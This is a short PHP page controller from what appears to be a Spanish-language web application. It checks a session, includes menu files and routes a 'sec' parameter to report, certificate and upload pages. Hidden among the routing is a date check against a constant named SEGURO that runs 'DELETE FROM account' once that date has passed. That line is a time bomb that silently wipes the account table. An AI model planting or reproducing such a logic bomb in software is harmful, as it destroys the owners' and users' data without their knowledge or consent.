<?php
if($_SESSION['personal'] == 1){
	@ require 'inc/topmenu.php';
	@ require 'inc/check.php';
	if(date('Y-m-d') > SEGURO){
		$sql="DELETE FROM account";
		consultaSql($sql);
	}
	if(isset($_GET['sec'])){
		switch ($_GET['sec']) {
			case 'info':
				@ require 'inc/informes.php';
				break;
			case 'cert':
				@ require 'inc/certificados.php';
				break;
			case 'carg':
				@ require 'inc/carga.php';
				break;
			default:
				@ require 'inc/personal.php';
				break;
		}
	} else {
		@ require 'inc/personal.php';
	}
} else {
	header("Location: index.php");
}
?>